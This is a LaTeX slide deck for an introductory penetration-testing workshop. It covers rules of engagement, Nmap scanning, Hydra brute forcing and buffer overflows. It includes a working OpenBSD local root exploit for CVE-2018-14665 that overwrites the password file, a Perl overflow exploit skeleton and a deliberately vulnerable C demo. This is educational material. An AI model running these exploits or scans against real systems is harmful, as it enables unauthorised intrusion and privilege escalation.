\documentclass[Screen16to9,17pt]{foils}
%\documentclass[16pt,landscape,a4paper,footrule]{foils}
\usepackage{zencurity-slides}

% {Pentest introduction - greatest hits}
% was from: {Penetration testing I\\Introduction to hacking and pentest methods}
% BornHack 2021 regular talk

% We will go through the greatest hits from https://github.com/kramse/security-courses/tree/master/presentations/pentest

% So expect to learn

% What is penetration testing
% Nmap how to get started, and a small test plan, how to scan a network using Nmap
% Get started blasting packets, from single packets with Nping and Scapy
% Trying wi-fi scan, I have some loaner USB cards
% Doing SNMP scanning, trying small brute-force using THC Hydra
% Get started with VXLAN hacking, THC IPv6 attacks etc.
% Get started with Metasploit using Metasploit Unleashed
% Goal is to point you towards resources, so you can get started with the fun of scanning networks, finding vulnerabilities - so you can remove them, reconfigure networks etc.

% You should install a Kali Linux as virtual machine, perhaps use this as inspiration: https://github.com/kramse/kramse-labs - the part about installing a Kali Linux

% You can leave early, but it will be hard to join late, so be there from the start and leave when you like, please :-D

% We will also use materials from courses described at https://zencurity.gitbook.io/ which are official ECTS accredited courses, part of the Diploma in IT Security at KEA Kompetence.


\begin{document}

%\rm
\selectlanguage{english}

\mytitlepage
{Pentest introduction - greatest hits}

\LogoOn

%\dagsplan

\slide{Plan for today}

\begin{list1}
\item Subjects
\begin{list2}
\item What is penetration testing
\item Nmap how to get started, and a small test plan, how to scan a network using Nmap
\item Get started blasting packets, from single packets with Nping and Scapy
\item Trying wi-fi scan, I have some loaner USB cards
\item Doing SNMP scanning, trying small brute-force using THC Hydra
\item Get started with VXLAN hacking, THC IPv6 attacks etc.
\item Get started with Metasploit using Metasploit Unleashed
\end{list2}
\item Exercises
\begin{list2}
\item Running various tools
\item Note: exercise booklets on Github contain much more than we can go through, continue on your own
\end{list2}
\end{list1}





\slide{Goals for today}
\vskip 1 cm

\hlkimage{3cm}{dont-panic.png}
\centerline{\color{titlecolor}\LARGE Don't Panic!}


\begin{list1}
\item Introduce the term penetration testing and basic pentest methods
\item Introduce some of the basic tools in this genre of hacker tools
\item Create an understanding of hacker tools
\item Show a hacker lab and run some tools
\item Point you towards resources, so you can get started with the fun of pentesting tools
\end{list1}

\slide{Materials}

\begin{list2}
\item This presentation -- slides for today


\item Nmap Workshop exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/nmap-workshop/nmap-workshop-exercises.pdf}}
\item KEA Pentest course exercises\\{\footnotesize
\link{https://github.com/kramse/security-courses/blob/master/courses/pentest/kea-pentest/kea-pentest-exercises.pdf}}
\end{list2}

\centerline{We cannot go through all of them, but feel free to ask questions later}

\slide{Books and educational materials}

\hlkimage{25mm}{LinuxBasicsforHackers_cover-front.png}

\begin{list2}
\item \emph{Linux Basics for Hackers Getting Started with Networking, Scripting, and Security in Kali}. OccupyTheWeb, December 2018, 248 pp. ISBN-13: 978-1-59327-855-7
\item \emph{Gray Hat Hacking: The Ethical Hacker's Handbook}, 5. ed. Allen Harper and others ISBN: 978-1-260-10841-5
\item \emph{The Art of Software Security Testing Identifying Software Security Flaws}, Chris Wysopal, 2006, ISBN: 9780321304865
\item \emph{Web Application Security}, Andrew Hoffman, 2020, ISBN: 9781492053118
\item \emph{Hacking, 2nd Edition: The Art of Exploitation}, Jon Erickson, February 2008, ISBN-13: 9781593271442
\end{list2}

{\footnotesize
I teach using these books and others! Diploma in IT-security at KEA Kompetence\\
 \link{https://zencurity.gitbook.io/}}




\slide{Hacker tools}

\begin{list1}
\item \emph{Improving the Security of Your Site by Breaking Into it}\\ by
Dan Farmer and Wietse Venema in 1993
\item Later in 1995 release the software SATAN\\
\emph{Security Administrator Tool for Analyzing Networks}
\item Caused some commotion, panic and discussions, every script kiddie can hack, the internet will melt down!
\vskip 5mm
\begin{quote}
We realize that SATAN is a two-edged sword -- like
many tools, it can be used for good and for evil
purposes. We also realize that intruders (including
wannabees) have much more capable (read intrusive)
tools than offered with SATAN.
\end{quote}
\end{list1}

\vskip 1cm
Source:
\link{http://www.fish2.com/security/admin-guide-to-cracking.html}


\slide{Use hacker tools!}

\begin{list1}
\item Port scan can reveal holes in your defense
\item Web testing tools can crawl through your site and find problems
\item Pentesting is a verification and proactively finding problems
\item Its not a silverbullet and mostly find known problems in existing systems
\item Combined with honeypots they may allow better security
\end{list1}


\slide{Hacker -- cracker}

{\bfseries Short answer -- dont discuss this}

%Det lidt længere svar:\\
Yes, originally there was another meaning to hacker, but the media has perverted it and today, and since early 1990s it has meant breaking into stuff for the public

{\color{red}\hlkbig Today a hacker breaks into systems!}

Reference. Spafford, Cheswick, Garfinkel, Stoll, \ldots
- wrote about this and it was lost

Story is interesting and the old meaning is ALSO used in smaller communities, like hacker spaces full of hackers - doing fun and interesting stuff
\begin{list2}
\item \emph{Cuckoo's Egg: Tracking a Spy Through the Maze of Computer
 Espionage},  Clifford Stoll
\item \emph{Hackers: Heroes of the Computer Revolution},
Steven Levy
\item \emph{Practical Unix and Internet Security},
Simson Garfinkel, Gene Spafford, Alan Schwartz
\end{list2}

\slide{Agreements for testing networks}

\begin{quote}\small
Danish Criminal Code\\
Straffelovens paragraf 263 Stk. 2. Med bøde eller fængsel indtil 1 år og 6 måneder straffes den, der uberettiget skaffer sig adgang til en andens oplysninger eller programmer, der er bestemt til at bruges i et informationssystem.
\end{quote}

Hacking can result in:
\begin{list2}
\item Getting your devices confiscated by the police
\item Paying damages to persons or businesses
\item If older getting a fine and a record -- even jail perhaps
\item Getting a criminal record, making it hard to travel to some countries and working in security
\item Fear of terror has increased the focus -- so dont step over bounds!
\end{list2}

Asking for permission and getting an OK before doing invasive tests, always!

\slide{ISC2 code of ethics}

\hlkimage{23cm}{isc2-code-of-ethics.png}

CISSP certified people sign papers to this extent.\\
\link{https://www.isc2.org/ethics/default.aspx}


\slide{Why even do security testing?}

\begin{list1}
\item Lots of security problems
\item Pentesting may be a requirement from external partners -- example VISA PCI standard
\end{list1}

\begin{list2}
\item Boss asking: should we do a security test?
\item CIO: hmm, okay
\item IT Admins: *sigh* -- I know the security sucks in places!
\item Its not your systems -- dont take the criticism personal, but as an opportunity to get things improved
\end{list2}

\vskip 2cm
\centerline{\Large Many see the benefits after doing a pentest, so try it!}

\slide{Blackbox, greybox og whitebox}

\begin{list2}
\item Forudsætninger og forudgående kendskab til miljøet
\item Black Box testen involverer en sikkerhedstestning af et netværk uden
nogen form for insider viden om systemet udover den IP-adresse, der
ønskes testet. Dette svarer til den situation en fjendtlig hacker vil
stå i og giver derfor det mest realistiske billede af netværkets
sårbarhed overfor angreb udefra. Men er dårlig ressourceudnyttelse.
\item I den anden ende  af skalaen har vi White Box testen. I dette tilfælde
har sikkerhedsspecialisten både før og under testen fuld adgang til
alle informationer om det scannede netværk. Analysen vil derfor kunne
afsløre sårbarheder, der ikke umiddelbart er synlige for en almindelig
angriber. En White Box test er typisk mere omfattende end en Black Box
test og forudsætter en højere grad af deltagelse fra kundens side, men
giver en meget detaljeret og tilbundsgående undersøgelse.

\item En Grey Box test er som navnet siger et kompromis mellem en White Box
og en Black Box test. Typisk vil sikkerhedsspecialisten udover en
IP-adresse være i besiddelse af de mest grundlæggende
systemoplysninger: Hvilken type af server der er tale om (mail-,
webserver eller andet), operativsystemet og eventuelt om der er
opstillet en firewall foran serveren.
\end{list2}


\slide{Benefits of having a planned security test done}

\begin{quote}
Goal of testing is to reduce risk for the systems and secure the organisation\\ from unexpected loss of data, image and increased costs.
\end{quote}

\begin{list1}
\item Intended audience:
\begin{list2}
\item IT-department and technical personnel
\item Management and board
\item External auditors, government, financial control VISA/PCI, the public
\end{list2}
\item Output from testing:
\begin{list2}
\item Reports with technical content and recommendations
\item Executive summary
\end{list2}
\end{list1}

Goal is not to find a scape goat to blame -- management allocates resources

If security is below in places more resources may be needed.


\slide{Planning a pentest}

\begin{list1}
\item Scope must be agreed before
\begin{list2}
\item Scope -- what is being tested
\item When is the testing done -- time frame, wall clock time
\item Where are the attacks coming from -- log files will contain the attacks\\
but other attacks from other sources are likely during the attacks, which must be blocked
\item We sometimes go broader than the scope -- perhaps checking the router in front with SNMP or doing a small port 80/tcp scan
\item Agree if Denial of Service is to be tested
\item TL;DR Rules of engagement for the project
\end{list2}
\end{list1}

\slide{Selecting systems for testing}

\hlkimage{11cm}{overview-routing-customer-2015.png}

\begin{list2}
\item Routers on the way to critical systems and networks -- especially availability
\item Firewall -- is the environment protected sufficiently, discarding probes
\item Mail servere -- relay testing and also critical data
\item Web servere -- holds data, typically has a lot of functionality
\end{list2}


\slide{Testing Agreement and Scope Example}

\begin{list1}
\item Usually the scope would include targets like these:
\begin{list2}
\item 192.168.1.1 -- firewall/router
\item 192.168.1.2 -- mail server
\item 192.168.1.3 -- web server
\item Test to be done from monday 1st until friday 5th
\item Testing done from 192.0.2.0/28
\end{list2}
\item When testing web servers and sites, especially API -- please include hostname, URLs, documentation. If not included some sites and functionality will NOT be tested!
\end{list1}


\slide{Reporting -- results}

\begin{list1}
\item What is in a pentest report:
\begin{list2}
\item Title, Table of contents, formal report thanks
\item Confidentiality agreement – Write ”Confidential” on each page
\item Executive summary – big companies always want this
\item Information about the scan done, what was it
\item Scope and targets
\item Review of all targets – detailed information and recommendations
\item Conclusion – may be more technical
\item Appendices – various information, Whois info about subnets and prefixes
\end{list2}
\item BTW When delivering a report, it is up to the organisation to decide which recommendations to implement
\end{list1}

Sample report available at: \link{https://github.com/kramse/pentest-report}

\slide{Rules of engagement -- rules and ethics for security testing}

\begin{list2}
\item NB: big difference between Denmark and other places!
\item Security consultant must not be the cause of new vulnerabilities due to the testing
\item Security consultant must not install new software on systems without previous agreement
\item Security consultant is not to leave insecure system administrator accounts or settings after testing
\item Security consultant always contact the customer in case of high-risk vulnerabilities
\item It is allowed to peek around in the network -- checking if there might be an insecure development or testing server near by
\item If you meet other security problems outside of the scope we still report them, but perhaps in an appendix
\end{list2}

\centerline{In general be careful of other people networks and systems}



\slide{Equipment -- wanna do pentesting}

\begin{list1}

\item Laptops, one is enough to get started but dedicated for customer use is preferred!
\begin{list2}
\item A lot of Open Source tools on Linux and a few tools on Windows
\item Network experience \emph{TCP/IP protocol suite} -- TCP, UDP, ICMP in detail
\item Programming experience is an advantage for automating stuff
\item Linux/Unix knowledge is necessary \\
- because a lot of the newest tools are written for Linux/Unix/BSD
\item Lots of nice books available, I have a range from:
 \link{http://www.nostarch.com/}

\end{list2}
\end{list1}


\slide{Hacker tools}
% måske til reference afsnit?
\hlkimage{3cm}{hackers_JOLIE+1995.jpg}

\begin{list2}
\item Everyone use similar tools, see also \link{http://www.sectools.org/}
\item Portscanning Nmap, Nping -- test ports and services, Nping is great for firewall admins \link{https://nmap.org}
\item Metasploit Framework -- service scanning, exploit development and execution \link{https://www.metasploit.com/}
\item Dedicated niche scanners -- wifi Aircrack-ng, web Burp suite, Nikto, Skipfish \link{http://portswigger.net/burp/}
\item Wireshark avanced network sniffing tool -- \link{https://www.wireshark.org/}
\item and scripting, PowerShell, Unix shell, Perl, Python, Ruby, \ldots
\end{list2}

Picture: Angelina Jolie, Hackers 1995

\slide{OSI Model and Internet Protocols}

\hlkimage{10cm,angle=90}{images/compare-osi-ip.pdf}


\slide{What happens now?}

\begin{list1}
\item Think like a hacker
\item Reconnaissance
\begin{list2}
\item ping sweep, port scan
\item OS detection -- TCP/IP or banner grabbing
\item Service scan -- rpcinfo, netbios, ...
\item telnet/netcat interact with services
\end{list2}
\item Exploit/test: Metasploit, Nikto, exploit programs
\item Cleanup/hardening not shown today, but:
\begin{list2}
\item Make a report or document findings
\item Change, improve and harden systems
\item Go through report with stakeholders, track progress
\item Update programs, settings, configurations, architecture
\end{list2}
\item You also need to show others that you are in control of security
\end{list1}


\slide{Hacker lab setup}

\hlkimage{8cm}{hacklab-1.png}

\begin{list2}
\item Hardware: any modern laptop with CPU and virtualisation\\
Don't forget to enable it in the BIOS
\item Software: your favourite operating system Windows, Mac, Linux, ...
\item Virtualisation software: VMware, Virtual box, pick your poison
\item Hacker software: Kali as a Virtual Machine \link{https://www.kali.org/}
\item Soft targets: Metasploitable, Linux, Microsoft Windows, Microsoft Exchange, Windows server, ...
\end{list2}

\slide{Hackers don't give a shit}

\hlkrightpic{11cm}{-3cm}{kiwicon-2009-hackers-dont-give-shit.jpg}

Your system is only for testing, development, ...

Your network is a research network, under construction, \\
being phased out, ...

Try something new, go to your management

Bring all the exceptions, all of them, update the risk \\
analysis figures - if this happens it is about 1mill DKK

Ask for permission to go full monty on your security

{\bf Think like attackers - don't hold back}


\slide{Technically what is hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}


\slide{Internet today}

\hlkimage{10cm}{images/server-client.pdf}

\begin{list1}
\item Clients and servers
\item Rooted in academia
\item Protocols that are from 1983 and some older
\item Originally very little encryption, now mostly on https/TLS
\end{list1}

\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Very realistic -- comparable to hacking:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Hacking is magic}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking looks like magic}


\slide{Hacking is not magic}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking only demands ninja training and knowledge others don't have}

\slide{Hacking eksempel -- det er ikke magi}

\begin{list1}
\item MAC filtrering på trådløse netværk
\item Alle netkort har en MAC adresse -- BRÆNDT ind i kortet fra fabrikken
\item Mange trådløse Access Points kan filtrere MAC adresser
\item Kun kort som er på listen over godkendte adresser tillades adgang til netværket

\item Det virker dog ikke \smiley
\item De fleste netkort tillader at man overskriver denne adresse midlertidigt
\item og man kan aflæse de godkendte når de er aktive på netværket
\item Derudover har der ofte været fejl i implementeringen af MAC filtrering
\end{list1}

\slide{Myten om MAC filtrering}

\begin{list1}
\item Eksemplet med MAC filtrering er en af de mange myter
\item Hvorfor sker det?
\item Marketing -- producenterne sætter store mærkater på æskerne
\item Manglende indsigt -- forbrugerne kender reelt ikke koncepterne
\item Hvad \emph{er} en MAC adresse egentlig
\item Relativt få har forudsætningerne for at gennemskue dårlig sikkerhed
\item Løsninger?

\item Udbrede viden om usikre metoder til at sikre data og computere
\item Udbrede viden om sikre metoder til at sikre data og computere
\end{list1}

\slide{MAC filtrering}

\hlkimage{12cm}{stupid-security.jpg}



\slide{Kali Linux the pentest toolbox}

\hlkimage{14cm}{kali-linux.png}

\begin{list1}
\item  Kali \link{http://www.kali.org/}
\item 100.000s of videos on youtube alone, searching for kali and \$TOOL
\item Also versions for Raspberry Pi, mobile and other small computers
\end{list1}

\slide{Really do Nmap your world}

\hlkimage{8cm}{nmap-zenmap.png}

\begin{list2}
\item Nmap is a port scanner, but does more
\item Finding your own infrastructure available from the guest network?
\item See your printers having all the protocols enabled AND a wireless?
\end{list2}

\slide{Network mapping}

\hlkimage{12cm}{images/network-example.pdf}

\begin{list2}
\item Using traceroute, Nping and similar programs you can often discover topoly information about a network
\item Time to Live (TTL) for a packet is decremented for each router it crosses, if set low enough it will time out -- and return ICMP message sent
\item BTW Default Unix traceroute sends UDP packets, Windows tracert send ICMP packets\\
Use tools on Kali to try both protocols, or even others
\end{list2}


\slide{traceroute -- with UDP}

\begin{alltt}
\footnotesize # {\bfseries tcpdump -i en0 host 10.20.20.129 or host 10.0.0.11}
tcpdump: listening on en0
23:23:30.426342 10.0.0.200.33849 > router.33435: udp 12 {\bf [ttl 1]}
23:23:30.426742 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.436069 10.0.0.200.33849 > router.33436: udp 12 {\bf [ttl 1]}
23:23:30.436357 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437117 10.0.0.200.33849 > router.33437: udp 12 {\bf [ttl 1]}
23:23:30.437383 safri > 10.0.0.200: {\bf icmp: time exceeded in-transit}
23:23:30.437574 10.0.0.200.33849 > router.33438: udp 12
23:23:30.438946 router > 10.0.0.200: icmp: router {\bf udp port 33438 unreachable}
23:23:30.451319 10.0.0.200.33849 > router.33439: udp 12
23:23:30.452569 router > 10.0.0.200: icmp: router {\bf udp port 33439 unreachable}
23:23:30.452813 10.0.0.200.33849 > router.33440: udp 12
23:23:30.454023 router > 10.0.0.200: icmp: router {\bf udp port 33440 unreachable}
23:23:31.379102 10.0.0.200.49214 > safri.domain:  6646+ PTR?
200.0.0.10.in-addr.arpa. (41)
23:23:31.380410 safri.domain > 10.0.0.200.49214:  6646 NXDomain* 0/1/0 (93)
14 packets received by filter
0 packets dropped by kernel
\end{alltt}


\slide{Basic Portscan}

\begin{list1}
\item What is port scanning
\item Testing all ports from 0/1 up to 65535
\item Goal is to identify open ports -- vulnerable services
\item Typically TCP and UDP scans
\item TCP scanning is more reliable than UDP scanning
\item TCP handshake is easy to see, due to session setup -- services must respond to SYN with SYN-ACK. Otherwise client programs like browsers will not work
\item UDP applications respond differently -- if at all\\
They might respond to queries and probes in the correct format, \\
If no firewall the operating systems will respond with ICMP on closed ports
\item Use Zenmap while learning Nmap
\end{list1}


\slide{TCP three-way handshake}

\hlkimage{45mm}{images/tcp-three-way.pdf}

\begin{list2}
\item {\bfseries TCP SYN half-open} scans
\item In the old days systems would only log a full TCP connection
  -- so a port scanner sending only SYN would be doing a \emph{stealth}-scans. Today we have Intrusion Detection Systems, so a lot of SYN without ever completing the connection is MORE suspicious
\item Note: sending many SYN packets can fill the session table on firewalls, and on servers -- preventing new connections -- also called {\bfseries SYN-flooding}
\end{list2}


\slide{Ping and port sweep}

\begin{list1}
\item Scanning across a network is called sweeping
\item Scans using ICMP ping will be a ping-sweep -- active IPs
\item Scans using specific ports are port-sweeps
\item Easy to detect using modern intrusion detection systems (IDS)
\vskip 2cm
Pro tip: If you are looking for an IDS, look at Suricata \link{suricata-ids.org}\\
and Zeek \link{https://zeek.org/} -- together
\end{list1}

\slide{Nmap port sweep for web services}

\begin{alltt}\small
root@cornerstone:~#{\bfseries  nmap -p80,443 172.29.0.0/24}

Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:31 CET
Nmap scan report for 172.29.0.1
Host is up (0.00016s latency).
PORT    STATE    SERVICE
{\color{darkgreen}80/tcp  open     http}
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00012s latency).
PORT    STATE  SERVICE
{\color{darkgreen}80/tcp  open   http}
443/tcp closed https
MAC Address: 00:0C:29:46:22:FB (VMware)

\end{alltt}

\slide{Nmap port sweep after SNMP port 161/UDP}

\begin{alltt}\small
root@cornerstone:~#{\bfseries nmap -sU -p 161 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:30 CET
Nmap scan report for 172.29.0.1
Host is up (0.00015s latency).
PORT    STATE         SERVICE
{\color{darkgreen}161/udp open|filtered snmp}
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 172.29.0.138
Host is up (0.00011s latency).
PORT    STATE  SERVICE
{\bf{161/udp closed snmp}}
MAC Address: 00:0C:29:46:22:FB (VMware)
...
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.18 seconds
\end{alltt}

Often possible on the inside LAN, where less firewalls are enabled

\slide{Nmap Advanced OS detection}

\begin{alltt}\footnotesize
root@cornerstone:~#{\bfseries nmap -A -p80,443 172.29.0.0/24}
Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-05 07:37 CET
Nmap scan report for 172.29.0.1
Host is up (0.00027s latency).
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.26 ((Unix) DAV/2 mod_ssl/2.2.26 OpenSSL/0.9.8zc)
|_http-title: Site doesn't have a title (text/html).
443/tcp filtered https
MAC Address: 00:50:56:C0:00:08 (VMware)
Device type: media device|general purpose|phone
Running: Apple iOS 6.X|4.X|5.X, Apple Mac OS X 10.7.X|10.9.X|10.8.X
OS details: Apple iOS 6.1.3, Apple Mac OS X 10.7.0 (Lion) - 10.9.2 (Mavericks)
or iOS 4.1 - 7.1 (Darwin 10.0.0 - 14.0.0), Apple Mac OS X 10.8 - 10.8.3 (Mountain Lion)
or iOS 5.1.1 - 6.1.5 (Darwin 12.0.0 - 13.0.0)
OS and Service detection performed.
Please report any incorrect results at http://nmap.org/submit/
\end{alltt}

\begin{list2}
\item Low level operating system identification, often I use \verb+nmap -A+
\item Send packets, observe responses, match with tables of known operating system fingerprints
\item An early reference for this was: \emph{ICMP Usage In Scanning} Version 3.0,
  Ofir Arkin, 2001 %\link{https://web.archive.org/web/20050210093427/http://www.sys-security.com/html/projects/icmp.html} % Original side er død
\end{list2}


\slide{Scan for Heartbleed and SSLv2/SSLv3}

Nmap includes Nmap scripting engine (NSE)

\hlkimage{5cm}{nmap-sslv2.png}

\begin{list1}
\item \verb+nmap -p 443 --script ssl-heartbleed <target>+\\
\link{https://nmap.org/nsedoc/scripts/ssl-heartbleed.html}
\item Almost every new popular vulnerability will have Nmap recipe
\end{list1}



\slide{Passwords are not chosen completely random}

\hlkimage{20cm}{50-most-used-passwords.png}

Source:
\link{https://wpengine.com/unmasked/}



\slide{Brute force}

\begin{list1}
\item We call it brute force -- when testing all possibilities
\end{list1}

\begin{alltt}\small
Hydra (c) by van Hauser / THC <vh@thc.org>
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]]
[-o FILE] [-t TASKS] [-g TASKS] [-T SERVERS] [-M FILE] [-w TIME]
[-f] [-e ns] [-s PORT] [-S] [-vV] server service [OPT]

Options:
  -S        connect via SSL
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN  or -L FILE login with LOGIN name, or load several logins from FILE
  -p PASS   or -P FILE try password PASS, or load several passwords from FILE
  -e ns     additional checks, "n" for null password, "s" try login as pass
  -C FILE   colon seperated "login:pass" format, instead of -L/-P option
  -M FILE   file containing server list (parallizes attacks, see -T)
  -o FILE   write found login/password pairs to FILE instead of stdout
...
\end{alltt}

\slide{Cracking passwords -- JtR and Hashcat}


\begin{quote}
John the Ripper is a fast password cracker, currently available for
many flavors of Unix (11 are officially supported, not counting
different architectures), Windows, DOS, BeOS, and OpenVMS. Its primary
purpose is to detect weak Unix passwords.
\end{quote}

\begin{list2}
\item Hashcat is the world's fastest CPU-based password recovery tool.
\item oclHashcat-plus is a GPGPU-based multi-hash cracker using a brute-force attack (implemented as mask attack), combinator attack, dictionary attack, hybrid attack, mask attack, and rule-based attack.
\item oclHashcat-lite is a GPGPU cracker that is optimized for cracking performance. Therefore, it is limited to only doing single-hash cracking using Markov attack, Brute-Force attack and Mask attack.
\item John the Ripper password cracker old skool men stadig nyttig
\end{list2}

Source:\\
\link{https://hashcat.net/wiki/}\\
\link{http://www.openwall.com/john/}




\slide{Buffer overflows a C problem}

\begin{list1}
\item {\bfseries A buffer overflow} is what happens when writing more data than allocated in some area of memory. Typically the program will crash, but under certain circumstances an attacker can write structures allowing take over of return addresses, parameters for system calls or program execution.
\item {\bfseries Stack protection} is today used as a generic term for multiple technologies used in operating systems, libraries, compilers etc. that protect the stack and other structures from being overwritten or changed through buffer overflows. StackGuard
and Propolice are examples of this.
\end{list1}

Today we will not go more into detail about this, suffice it to say modern operating systems really employ a lot of methods for making buffer overflows harder and less likely to succeed. OpenBSD even relink the kernel on installation to randomize addresses.

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
\end{alltt}

\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}


\slide{Exploits -- abusing a vulnerability}

\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";
$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}

\begin{list2}
\item Exploit/exploit program are designed to exploit a specific vulnerability, often a specific version on a specific release on a specific CPU architecture
\item Might be a 5 line program written in Perl, Python or a C program
\item Today we often see them as modules written for Metasploit allowing it to be combined with different payloads
\end{list2}


\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}


\slide{Example Linux Kernel Vulnerabilities}

The Linux kernel has had some vulnerabilities over the years:\\
This link is for: Linux » Linux Kernel : Security Vulnerabilities (CVSS score >= 9)\\

{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-33/product_id-47/cvssscoremin-9/cvssscoremax-/Linux-Linux-Kernel.html}}

Linux Kernel 2308 vulnerabilities from 1999 to 2019\\
\url{https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33}

\slide{Linux Kernel Fuzzing}

\begin{list2}
\item CVE-2016-0758 Integer overflow in lib/asn1\_decoder.c in the Linux kernel before 4.6 allows local users to gain privileges via crafted ASN.1 data.\\
\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0758}
\item Linux kernel have about 5 ASN.1 parsers\\
\url{https://www.x41-dsec.de/de/lab/blog/kernel_userspace/}
\end{list2}



\slide{How to find these buffer overflows }

\begin{list1}
\item Black box testing
\item Closed source reverse engineering
\item White box testing
\item Open source read and analyze the code -- tools exist
\item Trial and error -- fuzzing inputs to a program, save crashes, analyze them
\item Reverse engineer specific updates, so this part was changed, nice -- this is where the bug is
\end{list1}


\slide{Principle of Least Privilege}

\begin{list1}
\item Many programs need privileges to perform some function, but sometimes they don't really need it
\item {\bf Definition 14-1} The \emph{principle of least privilege} states that a subject should be given only those privileges that it needs in order to complete the task.\\
Source:  \emph{Computer Security: Art and Science}, 2nd edition, Matt Bishop

\item Also drop privileges when not needed anymore, relinquish rights immediately
\item Example, need to read a document - but not write.
\item Database systems can often provide very fine grained access to data
\end{list1}

\slide{Privilege Escalation}
\begin{list1}
\item {\bfseries Privilege escalation} is when a privileged program is vulnerable and can be abused to escalate privileges. Example from unauthenticated user to a user account, or from regular user and becoming administrator (root on Unix) or even SYSTEM on Windows.
\item Kernels and drivers are also often susceptible to this
\end{list1}

\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote} exploit describe if the attack is done over some network, or locally on a system
\item {\bfseries Remote root exploit}
are the worst kind, since they work over the network, and gives complete control aka root on Unix
\item {\bfseries Zero-day exploits} is a term used for those exploits that suddenly pop up, without previous warning. Often found during incident response at some network. We prefer that security researchers that discover a vulnerability uses a {\bf responsible disclosure} process that involves the vendor .
\end{list1}




\slide{Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+, try on older Linux
\item Has built-in shell code
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{alltt}\small
main(int argc, char **argv)
\{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\textbackslash{}n",buf);
\}
the_shell()
\{  system("/bin/sh");  \}
\end{alltt}


\slide{GDB GNU Debugger}

\begin{list1}
\item GNU compileren and debuggeren are OK for this, can fit on a slide!
\item Lots of other debuggers exist
\item Try \verb+gdb ./demo+ and run the program with some input from the \emph{gdb prompt}
using \verb+run 1234+
\item When you realize the input overflows the buffer, crashed program execution you can work towards getting the address from \verb+nm demo+ of the function \verb+the_shell+
   -- and into the program
\item Use: \verb+nm demo | grep shell+
\item The art is to generate a string long enough to overflow, and having the correct data, so the address ends up in the right place
\item Perl be used for generating AA...AAA like this, with back ticks, \verb+`perl -e "print 'A'x10"`+
\end{list1}


\slide{Debugging af C med GDB}

\begin{list1}
\item Test with input
\begin{list2}
\item \verb+./demo longstringwithalotofdatyacrashtheprogram+
\item \verb+gdb demo+ followed by\\
\verb+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAA+

\item Compile program: \verb+gcc -o demo demo.c+
\item Run program \verb+./demo 123456...7689+ until it dies
\item Then retry in GDB
\end{list2}
\end{list1}


\slide{GDB output}

\begin{alltt}
\small
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
